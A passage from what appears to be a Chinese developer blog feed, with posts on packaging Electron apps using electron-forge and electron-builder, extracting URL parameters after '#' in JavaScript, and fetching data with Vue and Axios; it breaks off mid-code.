<p><code>electron-forge</code> 官网介绍这是最快捷的打包方式。<br><code>electron-builder</code>(推荐) <a href="https://www.electron.build" target="_blank" rel="noopener">官网</a>介绍这是一个完备的Electron应用打包和分发解决方案，它致力于软件开发的集成体验，另外还带有在线更新的功能。<br><code>electron-packager</code> 直接打包为单文件，不支持跨平台打包，打包后体积较大。</p>
<h3 id="5-1、electron-forge快捷打包"><a href="#5-1、electron-forge快捷打包" class="headerlink" title="5.1、electron-forge快捷打包"></a>5.1、electron-forge快捷打包</h3><p>forge可以自动检测你的系统，然后打包成对应的可执行文件，但是可配置项目比较少。</p>
<h4 id="5-1-1、-安装forge依赖"><a href="#5-1-1、-安装forge依赖" class="headerlink" title="5.1.1、 安装forge依赖"></a>5.1.1、 安装forge依赖</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> yarn --registry=https://registry.npm.taobao.org add --dev @electron-forge/cli</span></span><br><span class="line">或者</span><br><span class="line"><span class="meta">$</span><span class="bash"> npm --registry=https://registry.npm.taobao.org install --save-dev @electron-forge/cli</span></span><br><span class="line">npm WARN deprecated request@2.88.2: request has been deprecated, see https://github.com/request/request/issues/3142</span><br><span class="line">npm WARN deprecated har-validator@5.1.5: this library is no longer supported</span><br><span class="line">npm WARN deprecated uuid@3.4.0: Please upgrade  to version 7 or higher.  Older versions may use Math.random() in certain circumstances, which is known to be problematic.  See https://v8.dev/blog/math-random for details.</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> lzma-native@8.0.1 install D:\electron-app\node_modules\lzma-native</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> node-gyp-build</span></span><br><span class="line"></span><br><span class="line">npm WARN electron-app@1.0.0 No repository field.</span><br><span class="line"></span><br><span class="line">+ @electron-forge/cli@6.0.0-beta.61</span><br><span class="line">added 472 packages from 359 contributors in 51.968s</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> npx electron-forge import</span></span><br><span class="line">- Checking your system</span><br><span class="line">‼ You are running Node.js version 12.9.1, but Electron Forge requires Node.js &gt;= 12.13.0.</span><br><span class="line">√ Checking your system</span><br><span class="line">It looks like you are missing some dependencies you need to get Electron running.</span><br><span class="line">Make sure you have git installed and Node.js version &gt;= 12.13.0</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 安装nodejs版本[v12.16.0](https://nodejs.org/download/release/v12.16.0/)，重新来一次</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 这个命令是初始化electron-forge，会自动修改 package.json 的内容: 添加几个打包的指令</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> npx electron-forge import</span></span><br><span class="line">- Checking your system</span><br><span class="line">√ Checking your system</span><br><span class="line">- Initializing Git Repository</span><br><span class="line">√ Initializing Git Repository</span><br><span class="line">- Writing modified package.json file</span><br><span class="line">√ Writing modified package.json file</span><br><span class="line">- Installing dependencies</span><br><span class="line">√ Installing dependencies</span><br><span class="line">- Writing modified package.json file</span><br><span class="line">√ Writing modified package.json file</span><br><span class="line">- Fixing .gitignore</span><br><span class="line">√ Fixing .gitignore</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">We have ATTEMPTED to convert your app to be in a format that electron-forge understands.</span><br><span class="line"></span><br><span class="line">Thanks for using "electron-forge"!!!</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> cat package.json</span></span><br><span class="line">&#123;</span><br><span class="line">  "name": "electron-app",</span><br><span class="line">  "version": "1.0.0",</span><br><span class="line">  "main": "index.js",</span><br><span class="line">  "authors": "demo",</span><br><span class="line">  "description": "this is demo",</span><br><span class="line">  "license": "MIT",</span><br><span class="line">  "devDependencies": &#123;</span><br><span class="line">    "@electron-forge/cli": "^6.0.0-beta.61",</span><br><span class="line">    "@electron-forge/maker-deb": "^6.0.0-beta.61",</span><br><span class="line">    "@electron-forge/maker-rpm": "^6.0.0-beta.61",</span><br><span class="line">    "@electron-forge/maker-squirrel": "^6.0.0-beta.61",</span><br><span class="line">    "@electron-forge/maker-zip": "^6.0.0-beta.61",</span><br><span class="line">    "electron": "^16.0.6"</span><br><span class="line">  &#125;,</span><br><span class="line">  "scripts": &#123;</span><br><span class="line">    "start": "electron-forge start",</span><br><span class="line">    "package": "electron-forge package",</span><br><span class="line">    "make": "electron-forge make"</span><br><span class="line">  &#125;,</span><br><span class="line">  "dependencies": &#123;</span><br><span class="line">    "electron-squirrel-startup": "^1.0.0"</span><br><span class="line">  &#125;,</span><br><span class="line">  "config": &#123;</span><br><span class="line">    "forge": &#123;</span><br><span class="line">      "packagerConfig": &#123;&#125;,</span><br><span class="line">      "makers": [</span><br><span class="line">        &#123;</span><br><span class="line">          "name": "@electron-forge/maker-squirrel",</span><br><span class="line">          "config": &#123;</span><br><span class="line">            "name": "electron_app"</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          "name": "@electron-forge/maker-zip",</span><br><span class="line">          "platforms": [</span><br><span class="line">            "darwin"</span><br><span class="line">          ]</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          "name": "@electron-forge/maker-deb",</span><br><span class="line">          "config": &#123;&#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          "name": "@electron-forge/maker-rpm",</span><br><span class="line">          "config": &#123;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="5-1-2、-forge-make-编译"><a href="#5-1-2、-forge-make-编译" class="headerlink" title="5.1.2、 forge make 编译"></a>5.1.2、 forge make 编译</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> npm run package</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> electron-app@1.0.0 package D:\gitlab\electron-app</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> electron-forge package</span></span><br><span class="line"></span><br><span class="line">- Checking your system</span><br><span class="line">√ Checking your system</span><br><span class="line">- Preparing to Package Application for arch: x64</span><br><span class="line">√ Preparing to Package Application for arch: x64</span><br><span class="line">- Preparing native dependencies</span><br><span class="line">√ Preparing native dependencies</span><br><span class="line">- Packaging Application</span><br><span class="line">√ Packaging Application</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> npm run make</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 注意: package.json 中不能缺少 authors\description .</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> electron-app@1.0.0 make D:\electron-app</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> electron-forge make</span></span><br><span class="line"></span><br><span class="line">- Checking your system</span><br><span class="line">√ Checking your system</span><br><span class="line">- Resolving Forge Config</span><br><span class="line">√ Resolving Forge Config</span><br><span class="line">We need to package your application before we can make it</span><br><span class="line">- Preparing to Package Application for arch: x64</span><br><span class="line">√ Preparing to Package Application for arch: x64</span><br><span class="line">- Preparing native dependencies</span><br><span class="line">√ Preparing native dependencies</span><br><span class="line">- Packaging Application</span><br><span class="line">√ Packaging Application</span><br><span class="line">Making for the following targets: squirrel</span><br><span class="line">- Making for target: squirrel - On platform: win32 - For arch: x64</span><br><span class="line">√ Making for target: squirrel - On platform: win32 - For arch: x64</span><br></pre></td></tr></table></figure>
<p>编译后的文件在 <code>out</code> 目录下：</p>
<ul>
<li><code>electron-app-win32-x64</code> 目录是打包(<code>electron-forge package</code>)目录，所有文件187MB，一般用于调试，不是分发。</li>
<li><code>make/squirrel.windows/x64</code> 目录是编译(<code>electron-forge make</code>) 目录，只有一个文件79.5MB，这就是可以分发的包。</li>
</ul>
<p>运行占用内存72MB</p>
<h4 id="5-1-3、-forge-跨平台打包"><a href="#5-1-3、-forge-跨平台打包" class="headerlink" title="5.1.3、 forge 跨平台打包"></a>5.1.3、 forge 跨平台打包</h4><p><a href="https://www.electronforge.io/config/makers" target="_blank" rel="noopener">【参考 electronforge makers 配置】</a></p>
<p>好像forge目前只能打包当前机器的平台，我在Win10平台通过修改配置，每次依然只输出Win平台，forge 并不会打包 linux 和 macos 平台的包，或者说我还没尝试成功？</p>
<blockquote>
<p>如果实在不支持跨平台打包，可以在Linux、MacOS平台进行打包。</p>
</blockquote>
<h3 id="5-2、-electron-builder打包"><a href="#5-2、-electron-builder打包" class="headerlink" title="5.2、 electron-builder打包"></a>5.2、 electron-builder打包</h3><p>本以为<code>electron-builder</code> 对跨平台构建支持的很好，但打开<a href="https://www.electron.build/multi-platform-build" target="_blank" rel="noopener">官网多平台构建</a>看到的第一段话却是：</p>
<blockquote>
<p>Don’t expect that you can build app for all platforms on one platform.<br>不要期望你可以在一个平台上创建适用于所有平台的应用。  </p>
</blockquote>
<p>本来 <code>electron-builder</code> 提供了一个在线跨平台构建的服务，但后来停掉了。</p>
<p>现在<a href="https://www.electron.build/multi-platform-build#docker" target="_blank" rel="noopener">【官网】</a>推荐使用Docker镜像来做跨平台构建。<br><figure class="highlight docker"><table><tr><td class="code"><pre><span class="line">docker <span class="keyword">run</span><span class="bash"> --rm -ti \</span></span><br><span class="line"><span class="bash"> --env-file &lt;(env | grep -iE <span class="string">'DEBUG|NODE_|ELECTRON_|YARN_|NPM_|CI|CIRCLE|TRAVIS_TAG|TRAVIS|TRAVIS_REPO_|TRAVIS_BUILD_|TRAVIS_BRANCH|TRAVIS_PULL_REQUEST_|APPVEYOR_|CSC_|GH_|GITHUB_|BT_|AWS_|STRIP|BUILD_'</span>) \</span></span><br><span class="line"><span class="bash"> --env ELECTRON_CACHE=<span class="string">"/root/.cache/electron"</span> \</span></span><br><span class="line"><span class="bash"> --env ELECTRON_BUILDER_CACHE=<span class="string">"/root/.cache/electron-builder"</span> \</span></span><br><span class="line"><span class="bash"> -v <span class="variable">$&#123;PWD&#125;</span>:/project \</span></span><br><span class="line"><span class="bash"> -v <span class="variable">$&#123;PWD##*/&#125;</span>-node-modules:/project/node_modules \</span></span><br><span class="line"><span class="bash"> -v ~/.cache/electron:/root/.cache/electron \</span></span><br><span class="line"><span class="bash"> -v ~/.cache/electron-builder:/root/.cache/electron-builder \</span></span><br><span class="line"><span class="bash"> electronuserland/builder:wine</span></span><br></pre></td></tr></table></figure></p>
<p>但还是不要想着跨平台构建了，说不定很多坑位呢？而且Windows上用Docker也是不少坑位的吧!<br>还是老老实实在相应的平台做构建吧！</p>
<h4 id="5-2-1、-安装electron-builder依赖"><a href="#5-2-1、-安装electron-builder依赖" class="headerlink" title="5.2.1、 安装electron-builder依赖"></a>5.2.1、 安装electron-builder依赖</h4><p><a href="https://www.electron.build/#electron-builder" target="_blank" rel="noopener">官网参考</a></p>
<blockquote>
<p>node 版本要求 &gt;=14.0.0</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ls</span></span><br><span class="line">index.html  index.js  node_modules/  package.json  preload.js  yarn.lock</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> cat package.json</span></span><br><span class="line">&#123;</span><br><span class="line">  "name": "electron-demo",</span><br><span class="line">  "version": "1.0.0",</span><br><span class="line">  "description": "this is demo",</span><br><span class="line">  "main": "index.js",</span><br><span class="line">  "author": "demo",</span><br><span class="line">  "license": "MIT",</span><br><span class="line">  "devDependencies": &#123;</span><br><span class="line">    "electron": "^16.0.6"</span><br><span class="line">  &#125;,</span><br><span class="line">  "scripts": &#123;</span><br><span class="line">    "start": "electron ."</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> yarn --registry=https://registry.npm.taobao.org add --dev electron-builder</span></span><br><span class="line">或者</span><br><span class="line"><span class="meta">$</span><span class="bash"> npm --registry=https://registry.npm.taobao.org install --save-dev electron-builder</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> cat package.json</span></span><br><span class="line">&#123;</span><br><span class="line">  "name": "electron-demo",</span><br><span class="line">  "version": "1.0.0",</span><br><span class="line">  "description": "this is demo",</span><br><span class="line">  "main": "index.js",</span><br><span class="line">  "author": "demo",</span><br><span class="line">  "license": "MIT",</span><br><span class="line">  "devDependencies": &#123;</span><br><span class="line">    "electron": "^16.0.6",</span><br><span class="line">    "electron-builder": "^22.14.5"</span><br><span class="line">  &#125;,</span><br><span class="line">  "scripts": &#123;</span><br><span class="line">    "start": "electron ."</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> vim package.json</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  "name": "electron-demo",</span><br><span class="line">  "version": "1.0.0",</span><br><span class="line">  "description": "this is demo",</span><br><span class="line">  "main": "index.js",</span><br><span class="line">  "author": "demo",</span><br><span class="line">  "license": "MIT",</span><br><span class="line">  "devDependencies": &#123;</span><br><span class="line">    "electron": "^16.0.6",</span><br><span class="line">    "electron-builder": "^22.14.5"</span><br><span class="line">  &#125;,</span><br><span class="line">  "build": &#123;</span><br><span class="line">      "productName": "demo",</span><br><span class="line">      "appId": "com.github.demo",</span><br><span class="line">      "asar": false,    // 是否将前端代码打包</span><br><span class="line">      "copyright": "© demo 2022",</span><br><span class="line">      "directories": &#123;</span><br><span class="line">        "output": "dist"</span><br><span class="line">      &#125;,</span><br><span class="line">      "nsis": &#123;</span><br><span class="line">        "oneClick": false,</span><br><span class="line">        "allowElevation": true,</span><br><span class="line">        "allowToChangeInstallationDirectory": true, // 允许用户自定义安装目录</span><br><span class="line">        "installerIcon": "favicon.ico",</span><br><span class="line">        "uninstallerIcon": "favicon.ico",</span><br><span class="line">        "installerHeaderIcon": "favicon.ico",</span><br><span class="line">        "createDesktopShortcut": true,</span><br><span class="line">        "createStartMenuShortcut": true,</span><br><span class="line">        "shortcutName": "demo"</span><br><span class="line">      &#125;,</span><br><span class="line">      "win": &#123;</span><br><span class="line">        "icon": "favicon.ico",</span><br><span class="line">        "requestedExecutionLevel": "requireAdministrator",  // 获取管理员权限</span><br><span class="line">        "target": [</span><br><span class="line">          &#123;</span><br><span class="line">            "target": "nsis",</span><br><span class="line">            "arch": [</span><br><span class="line">              "x64"</span><br><span class="line">            ]</span><br><span class="line">          &#125;</span><br><span class="line">        ],</span><br><span class="line">        "extraFiles": &#123; </span><br><span class="line">          "from": "./from/",</span><br><span class="line">          "to": "to"</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    "scripts": &#123;</span><br><span class="line">      "start": "electron .",</span><br><span class="line">      "distOS": "electron-builder --mac",</span><br><span class="line">      "distWin64": "electron-builder --win --x64",</span><br><span class="line">      "distWin32": "electron-builder --win --ia32",</span><br><span class="line">      "postinstall": "electron-builder install-app-deps"</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>favicon.ico 文件尺寸必须是256 * 256</p>
</blockquote>
<p>在User根目录的 <code>.npmrc</code> 文件 （如果没有则新建一个），设置以下镜像地址：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ELECTRON_MIRROR=http://npm.taobao.org/mirrors/electron/</span><br></pre></td></tr></table></figure></p>
<h4 id="5-2-2、-electron-builder执行构建"><a href="#5-2-2、-electron-builder执行构建" class="headerlink" title="5.2.2、 electron-builder执行构建"></a>5.2.2、 electron-builder执行构建</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> npm run distWin64</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> electron-demo@1.0.0 distWin64</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> electron-builder --win --x64</span></span><br><span class="line"></span><br><span class="line">  • electron-builder  version=22.14.5 os=10.0.18362</span><br><span class="line">  • loaded configuration  file=package.json ("build" field)</span><br><span class="line">  • packaging       platform=win32 arch=x64 electron=16.0.6 appOutDir=dist\win-unpacked</span><br><span class="line">  • asar usage is disabled — this is strongly not recommended  solution=enable asar and use asarUnpack to unpack files that must be externally available</span><br><span class="line">  • file source doesn't exist  from=C:\Users\Administrator\Desktop\electron-app2\from</span><br><span class="line">  • asar usage is disabled — this is strongly not recommended  solution=enable asar and use asarUnpack to unpack files that must be externally available</span><br><span class="line">  • building        target=nsis file=dist\demo Setup 1.0.0.exe archs=x64 oneClick=false perMachine=false</span><br><span class="line">  ⨯ Get "https://github.com/electron-userland/electron-builder-binaries/releases/download/nsis-3.0.4.2/nsis-3.0.4.2.7z": dial tcp 20.205.243.166:443: connectex: 由于连接方在一段时间后没有正确答复或连接的主机没有反应，连接尝试失败。</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 换一下电脑的DNS为 `119.29.29.29` 重新试一下就可以了。</span></span><br><span class="line"></span><br><span class="line">  • downloading     url=https://github.com/electron-userland/electron-builder-binaries/releases/download/nsis-3.0.4.2/nsis-3.0.4.2.7z size=1.4 MB parts=1</span><br><span class="line">  • downloaded      url=https://github.com/electron-userland/electron-builder-binaries/releases/download/nsis-3.0.4.2/nsis-3.0.4.2.7z duration=18.361s</span><br><span class="line">  • downloading     url=https://github.com/electron-userland/electron-builder-binaries/releases/download/nsis-resources-3.4.1/nsis-resources-3.4.1.7z size=731 kB parts=1</span><br><span class="line">  • downloaded      url=https://github.com/electron-userland/electron-builder-binaries/releases/download/nsis-resources-3.4.1/nsis-resources-3.4.1.7z duration=2.328s</span><br><span class="line">  • building block map  blockMapFile=dist\demo Setup 1.0.0.exe.blockmap</span><br></pre></td></tr></table></figure>
<p>构建好的文件在dist目录下，<code>demo Setup 1.0.0.exe</code> 文件大小为 <code>57.8MB</code>，这是一个nsis安装包，可以自定义安装的目录。</p>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>Electron</tag>
      </tags>
  </entry>
  <entry>
    <title>JS获取URL中#后面的参数</title>
    <url>/%E5%89%8D%E7%AB%AF/JS%E8%8E%B7%E5%8F%96URL%E4%B8%AD#%E5%90%8E%E9%9D%A2%E7%9A%84%E5%8F%82%E6%95%B0/</url>
    <content><![CDATA[<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script language=&quot;javascript&quot;&gt;</span><br><span class="line">function getarg(url)&#123;</span><br><span class="line">arg=url.split(&quot;#&quot;);</span><br><span class="line">return arg[1];</span><br><span class="line">&#125; </span><br><span class="line">alert(getarg(&apos;http://www.iswtf.com/test.php#ID=58&apos;));</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>昨天遇到这个问题：在A页面中通过location.href跳转到另一个B页面，此跳转地址是<a href="http://www.xyz.com/aa.html#bb.html?param=xxx" target="_blank" rel="noopener">http://www.xyz.com/aa.html#bb.html?param=xxx</a>  现在要怎么在B页面中取到param的值？现在的情况是跳到B页面后地址栏显示的就是<a href="http://www.xyz.com/aa.html#bb.html" target="_blank" rel="noopener">http://www.xyz.com/aa.html#bb.html</a> 后面的参数部分没有了，取到的参数值也是空的</p>
<p>搞了好久也没出来，最后问了大牛才发现我的基本功不行啊 理解就出错了，#后的内容都不会传到服务端的，所以到新页面看到的地址栏中就没有#后的参数，经大牛指点，把地址改为：<br><a href="http://www.xyz.com/aa.html?param=xxx#bb.html" target="_blank" rel="noopener">http://www.xyz.com/aa.html?param=xxx#bb.html</a>  就是先加参数，再加#  因为这个页面是有iframe的，所以其实也是传参数到aa.html的，并不是bb.html<br>具体细看下下列的各对象说明就明白了<br>location：子对象<br>document.location.hash          // #号后的部分<br>document.location.host          // 域名+端口号<br>document.location.hostname      // 域名<br>document.location.href          // 完整URL<br>document.location.pathname      // 目录部分<br>document.location.port          // 端口号<br>document.location.protocol      // 网络协议(http:)<br>document.location.search        // ?号后的部分</p>
<p>然后到跳转后的页面处理这个地址就可以取到参数值了，方法：</p>
<script type="text/javascript">

//取到上一页面传过来的参数
var $ = $ || {}; 
$.getParam = function( key, strURL ){
strURL = strURL || window.location.search;
return new RegExp( "(^|\\?|&)" + key + "=([^&]*)(\\s|&|$)", "i" ).test( strURL ) ?
decodeURIComponent( RegExp.$2.replace( /\+/g, " " ) ) : "";
};
// console.log($.getParam(‘param‘)); //第二个参数不传拿当前window.location 用于普通页面
// console.log($.getParam(‘param‘,top.window.location)); //用于包括有iframe的页面,得到的结果是xxx#bbb.html
console.log($.getParam(‘param‘,top.window.location.search)); //用于有iframe的页面，search是指里面的参数，hash是指#后的内容 得到的结果是xxx
</script>


<p>再引用一下<a href="http://www.cnblogs.com/kaituorensheng/p/3776527.html内容，说明下#" target="_blank" rel="noopener">http://www.cnblogs.com/kaituorensheng/p/3776527.html内容，说明下#</a></p>
<p>URL中“#” “？” &amp;“”号的作用</p>
<ol>
<li><p>#</p>
<p> 10年9月，twitter改版。一个显著变化，就是URL加入了”#!”符号。比如，改版前的用户主页网址为<a href="http://twitter.com/username改版后，就变成了http://twitter.com/#!/username" target="_blank" rel="noopener">http://twitter.com/username改版后，就变成了http://twitter.com/#!/username</a></p>
</li>
</ol>
<p>location是javascript里边管理地址栏的内置对象，比如location.href就管理页面的url，用location.href=url就可以直接将页面重定向url。而location.hash则可以用来获取或设置页面的标签值。<br>比如<a href="http://domain/#admin的location.hash=&quot;#admin&quot;。利用这个属性值可以做一个非常有意义的事情。" target="_blank" rel="noopener">http://domain/#admin的location.hash=&quot;#admin&quot;。利用这个属性值可以做一个非常有意义的事情。</a><br>很多人都喜欢收藏网页，以便于以后的浏览。不过对于Ajax页面来说的话，一般用一个页面来处理所有的事务，也就是说，如果你浏览到一个Ajax页面里边有意思的内容，想将它收藏起来，可是地址只有一个呀，下次你打开这个地址，还是得像以往一样不断地去点击网页，找到你钟情的那个页面。另外的话，浏览器上的“前进”“后退”按钮也会失效，这于很多习惯了传统页面的用户来说，是一个很大的使用障碍。<br>那么，怎么用location.hash来解决这两个问题呢？其实一点也不神秘。<br>比如，我的作者管理系统，主要功能有三个：普通搜索、高级搜索、后台管理，我分别给它们分配一个hash值：#search、#advsearch、#admin，在页面初始化的时候，通过window.location.hash来判断用户需要访问的页面，然后通过javascript来调整显示页面。比如： </p>
<p>var hash;<br>hash=(!window.location.hash)?”#search”:window.location.hash;<br>window.location.hash=hash;<br>//调整地址栏地址，使前进、后退按钮能使用<br>switch(hash){<br>case “#search”:<br>selectPanel(“pnlSearch”); //显示普通搜索面板<br>break;<br>case “#advsearch”:<br>case “#admin”:<br>} </p>
<p>通过window.location.hash=hash这个语句来调整地址栏的地址，使得浏览器里边的“前进”、“后退”按钮能正常使用（实质上欺骗了浏览器）。然后再根据hash值的不同来显示不同的面板（用户可以收藏对应的面板了），这就使得Ajax页面的浏览趋于传统化了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">获取#的位置截取字符串的形式 例如： </span><br><span class="line">var url=window.location.href;//获取地址栏 url </span><br><span class="line">var index=url.indexOf(&apos;#&apos;);//获取#的位置 </span><br><span class="line">var paramVal=url.substr(index,url.length);//获取 # 后面所有字符串</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
  </entry>
  <entry>
    <title>Vue-Axios异步加载数据</title>
    <url>/%E5%89%8D%E7%AB%AF/Vue-Axios%E5%BC%82%E6%AD%A5%E5%8A%A0%E8%BD%BD%E6%95%B0%E6%8D%AE/</url>
    <content><![CDATA[<p>一开始使用 <code>then(function (response){})</code> 的方式，一直无法调用到data的变量。<br>改为 <code>then(response =&gt;{})</code> 这种方式就可以了。</p>
<p>直接贴 <code>TestList.vue</code> 代码</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"title"</span>&gt;</span><br><span class="line">    &lt;h1&gt;&#123;&#123; msg &#125;&#125;&lt;<span class="regexp">/h1&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">    &lt;ul&gt;</span></span><br><span class="line"><span class="regexp">      &lt;li v-for="item in metadata"&gt;</span></span><br><span class="line"><span class="regexp">        &lt;h3&gt;&#123;&#123; item.name &#125;&#125;&lt;/</span>h3&gt;</span><br><span class="line">        &lt;img style=<span class="string">"width: 80px ;height: 80px"</span> :src=item.icon /&gt;</span><br><span class="line">        &lt;h5&gt;作者 &#123;&#123; item.author &#125;&#125;&lt;<span class="regexp">/h5&gt;</span></span><br><span class="line"><span class="regexp">        &lt;span&gt;&#123;&#123; item.description &#125;&#125;&lt;/</span>span&gt;</span><br><span class="line">      &lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/u</span>l&gt;</span><br><span class="line"></span><br><span class="line">  &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">&lt;/</span>template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">"axios"</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">    name: <span class="string">'TestList'</span>,</span><br><span class="line">    data () &#123;</span><br><span class="line">      <span class="keyword">return</span> &#123;</span><br><span class="line">        msg: <span class="string">'这是列表'</span>,</span><br><span class="line">        metadata: [],</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    methods:&#123;</span><br><span class="line">      </span><br><span class="line">      getMetadata()&#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'getMetadata...'</span>);</span><br><span class="line">        axios</span><br><span class="line">          .get(<span class="string">'http://localhost:6868/story/metadata'</span>)</span><br><span class="line">          .then(<span class="function"><span class="params">response</span> =&gt;</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"getMetadata Response ok"</span>)</span><br><span class="line">            <span class="keyword">this</span>.metadata = response.data.data.works;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"----------------"</span>)</span><br><span class="line">          &#125;).catch(<span class="function"><span class="params">error</span>=&gt;</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"getMetadata Response Error"</span>)</span><br><span class="line">            <span class="built_in">console</span>.log(error)</span><br><span class="line">        &#125;)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    mounted () &#123;</span><br><span class="line">      <span class="comment">//渲染之后执行</span></span><br><span class="line">      <span class="keyword">this</span>.getMetadata();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">&lt;!-- Add "scoped" attribute to limit CSS to this component only --&gt;</span></span><br><span class="line"><span class="regexp">&lt;style scoped&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>style&gt;</span><br></pre></td></tr></table></figure>
<h3 id="AXios的常用方法"><a href="#AXios的常用方法" class="headerlink" title="AXios的常用方法"></a>AXios的常用方法</h3><p>定义一个 <code>api.js</code> 文件</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">'axios'</span></span><br><span class="line"><span class="keyword">const</span> api = axios.create();</span><br><span class="line">api.defaults.baseURL = <span class="string">'http://api.com'</span>;</span><br><span class="line">api.defaults.timeout = <span class="number">5000</span>;</span><br><span class="line"><span class="comment">//可以设置头信息</span></span><br><span class="line">api.defaults.headers.common[<span class="string">'Content-Type'</span>] = <span class="string">'application/x-www-form-urlencoded'</span>;</span><br><span class="line">api.defaults.headers.common[<span class="string">'X-Requested-With'</span>] = <span class="string">'XMLHttpRequest'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//请求拦截</span></span><br><span class="line">api.interceptors.request.use(<span class="function"><span class="keyword">function</span> (<span class="params">config</span>) </span>&#123;</span><br><span class="line">    <span class="comment">//在发送请求之前做些什么，比如给header设置 AccessToken</span></span><br><span class="line">    config.headers.common[<span class="string">'access-token'</span>] = <span class="string">'xxxxx'</span>;</span><br><span class="line">&#125;, <span class="function"><span class="keyword">function</span> (<span class="params">error</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 对请求错误做些什么</span></span><br><span class="line">    <span class="built_in">console</span>.log(error);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Promise</span>.reject(error);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加响应拦截器</span></span><br><span class="line">api.interceptors.response.use(<span class="function"><span class="keyword">function</span> (<span class="params">response</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 对响应数据做点什么</span></span><br><span class="line">    <span class="comment">// 加到时器主要是为了 展示Loading效果 项目中应去除</span></span><br><span class="line">    <span class="keyword">return</span> response;</span><br><span class="line">  &#125;, <span class="function"><span class="keyword">function</span> (<span class="params">error</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 对响应错误做点什么</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(error.response) &#123;</span><br><span class="line">      <span class="keyword">if</span>(error.response.status== <span class="number">401</span>) &#123;</span><br><span class="line">          <span class="comment">// 如果返回401 即没有权限，跳到登录页重新登录</span></span><br><span class="line">        alert(<span class="string">'请重新登录'</span>);</span><br><span class="line">        router.replace(&#123;</span><br><span class="line">          path: <span class="string">'/login'</span>,</span><br><span class="line">          query: &#123;<span class="attr">redirect</span>: 